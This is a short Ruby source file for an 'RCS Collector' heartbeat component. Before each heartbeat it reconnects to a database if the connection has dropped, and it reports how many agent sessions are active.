require 'rcs-common/trace'
require 'rcs-common/systemstatus'
require 'rcs-common/heartbeat'

require_relative 'sessions.rb'

module RCS
  module Collector
    class HeartBeat < RCS::HeartBeat::Base
      component :collector

      before_heartbeat do
        # if the database connection has gone
        # try to re-login to the database again
        unless DB.instance.connected?
          trace :debug, "heartbeat: try to reconnecto to rcs-db"
          DB.instance.connect!(:carrier)
        end

        # still no luck ?  return and wait for the next iteration
        !!DB.instance.connected?
      end

      def message
        # retrieve how many session we have
        # this number represents the number of agent that are synchronizing
        active_sessions = SessionManager.instance.length

        # if we are serving agents, report it accordingly
        message = (active_sessions > 0) ? "Serving #{active_sessions} sessions" : "Idle..."
      end
    end
  end
end
